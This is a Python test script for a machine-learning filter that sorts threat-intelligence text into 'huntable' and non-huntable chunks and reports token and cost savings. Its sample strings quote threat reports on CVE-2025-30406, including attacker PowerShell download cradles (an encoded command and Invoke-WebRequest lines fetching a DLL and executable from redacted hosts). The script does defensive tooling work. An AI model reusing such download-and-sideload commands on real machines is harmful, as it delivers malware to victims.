#!/usr/bin/env python3
"""
Comprehensive test script for the content filtering system.
"""

import sys
import os
sys.path.insert(0, 'src')

from utils.content_filter import ContentFilter

def test_content_filter():
    """Test the content filtering system with various scenarios."""
    
    print("🧪 Content Filtering System Test")
    print("=" * 50)
    
    # Initialize filter
    filter_system = ContentFilter('models/content_filter.pkl')
    
    # Test scenarios
    test_scenarios = [
        {
            "name": "Pure Huntable Content",
            "content": """
            Post exploitation Huntress has also observed threat actors attempting to use encoded PowerShell to download and sideload a DLL via a commonly used cradle technique: 
            Command: powershell.exe -encodedCommand REDACTEDBASE64PAYLOAD== 
            Cleartext: Invoke-WebRequest -uri http://REDACTED:REDACTED/d3d11.dll -outfile C:UsersPublicREDACTEDd3d11.dll
            Command: Invoke-WebRequest -uri http://redacted:redacted/Centre.exe -outfile C:UsersPublicRedactedCentre.exe
            This Centre.exe executable, likely named after the vulnerability, is a renamed "Wallpaper Engine Launcher" from Kristjan Skutta originally named launcher.exe.
            """,
            "expected_reduction": "low"
        },
        {
            "name": "Pure Not Huntable Content",
            "content": """
            Acknowledgement We would like to extend our gratitude to the Sitecore team for their support throughout this investigation. 
            Additionally, we are grateful to Tom Bennett and Nino Isakovic for their assistance with the payload analysis. 
            We also appreciate the valuable input and technical review provided by Richmond Liclican and Tatsuhiko Ito.
            Contact Mandiant If you believe your systems may be compromised or you have related matters to discuss, contact Mandiant for incident response assistance via the following methods: Web Form US: +1 (844) 613-7588 International: +1 (703) 996-3012 Email: investigations@mandiant.com
            """,
            "expected_reduction": "high"
        },
        {
            "name": "Mixed Content (Realistic)",
            "content": """
            Post exploitation Huntress has also observed threat actors attempting to use encoded PowerShell to download and sideload a DLL via a commonly used cradle technique: 
            Command: powershell.exe -encodedCommand REDACTEDBASE64PAYLOAD== 
            Cleartext: Invoke-WebRequest -uri http://REDACTED:REDACTED/d3d11.dll -outfile C:UsersPublicREDACTEDd3d11.dll
            
            Acknowledgement We would like to extend our gratitude to the Sitecore team for their support throughout this investigation.
            
            This Centre.exe executable, likely named after the vulnerability, is a renamed "Wallpaper Engine Launcher" from Kristjan Skutta originally named launcher.exe. It should also be noted that the d3d11.dll file is the same file previously reported in our recent CrushFTP blog.
            
            Contact Mandiant If you believe your systems may be compromised or you have related matters to discuss, contact Mandiant for incident response assistance.
            
            the Centre.exe executable connected to these IP addresses: 104.21.16[.]1 104.21.48[.]1 Threat actors have also been observed performing lateral movement and performing installation of remote access tooling, namely MeshCentral.
            """,
            "expected_reduction": "medium"
        },
        {
            "name": "Large Mixed Content",
            "content": """
            Post exploitation Huntress has also observed threat actors attempting to use encoded PowerShell to download and sideload a DLL via a commonly used cradle technique: 
            Command: powershell.exe -encodedCommand REDACTEDBASE64PAYLOAD== 
            Cleartext: Invoke-WebRequest -uri http://REDACTED:REDACTED/d3d11.dll -outfile C:UsersPublicREDACTEDd3d11.dll
            Command: Invoke-WebRequest -uri http://redacted:redacted/Centre.exe -outfile C:UsersPublicRedactedCentre.exe
            
            Acknowledgement We would like to extend our gratitude to the Sitecore team for their support throughout this investigation. Additionally, we are grateful to Tom Bennett and Nino Isakovic for their assistance with the payload analysis. We also appreciate the valuable input and technical review provided by Richmond Liclican and Tatsuhiko Ito.
            
            This Centre.exe executable, likely named after the vulnerability, is a renamed "Wallpaper Engine Launcher" from Kristjan Skutta originally named launcher.exe. It should also be noted that the d3d11.dll file is the same file previously reported in our recent CrushFTP blog.
            
            Contact Mandiant If you believe your systems may be compromised or you have related matters to discuss, contact Mandiant for incident response assistance via the following methods: Web Form US: +1 (844) 613-7588 International: +1 (703) 996-3012 Email: investigations@mandiant.com
            
            the Centre.exe executable connected to these IP addresses: 104.21.16[.]1 104.21.48[.]1 Threat actors have also been observed performing lateral movement and performing installation of remote access tooling, namely MeshCentral.
            
            This highlights how quickly threat actors can pivot to leverage new vulnerabilities, but that their post attack methods don't necessarily have to change in order to be effective.
            
            We don't have any intentions of sharing the proof-of-concept to embolden other adversaries, but once an external proof of concept is available, we will refrain from sharing further technical details and our own internal proof-of-concept.
            
            Chainsaw rule to enable easy detection.
            
            If a Gladinet CentreStack or Triofox server is exposed to the Internet with these hardcoded keys, it is in immediate danger.
            
            CVE-2025-30406 is known to be actively exploited by threat actors, and this 9.0 critical severity issue has no "prerequisites" other than knowing the default key values.
            """,
            "expected_reduction": "medium"
        }
    ]
    
    # Test different confidence thresholds
    confidence_thresholds = [0.3, 0.5, 0.7, 0.8]
    
    for scenario in test_scenarios:
        print(f"\n📝 Testing: {scenario['name']}")
        print("-" * 40)
        
        content = scenario['content']
        original_length = len(content)
        original_tokens = original_length // 4
        
        print(f"Original: {original_length} chars ({original_tokens} tokens)")
        
        for threshold in confidence_thresholds:
            result = filter_system.filter_content(content, min_confidence=threshold, chunk_size=500)
            
            filtered_length = len(result.filtered_content)
            filtered_tokens = filtered_length // 4
            reduction_percent = (1 - filtered_length / original_length) * 100
            tokens_saved = original_tokens - filtered_tokens
            cost_savings = (tokens_saved / 1000000) * 5.00  # GPT-4o input pricing
            
            print(f"  Threshold {threshold}: {reduction_percent:.1f}% reduction, {tokens_saved} tokens saved, ${cost_savings:.4f}")
        
        # Show what gets filtered at 0.7 threshold
        result = filter_system.filter_content(content, min_confidence=0.7, chunk_size=500)
        if result.removed_chunks:
            print(f"\n  🗑️  Removed chunks at 0.7 threshold:")
            for i, chunk in enumerate(result.removed_chunks[:3]):
                print(f"    {i+1}. {chunk['text'][:80]}... (conf: {chunk['confidence']:.3f})")
    
    print(f"\n✅ Test completed!")
    print(f"\n💡 Recommendations:")
    print(f"  - Use threshold 0.7 for balanced filtering")
    print(f"  - Use threshold 0.5 for aggressive cost savings")
    print(f"  - Use threshold 0.8 for conservative filtering")

if __name__ == "__main__":
    test_content_filter()
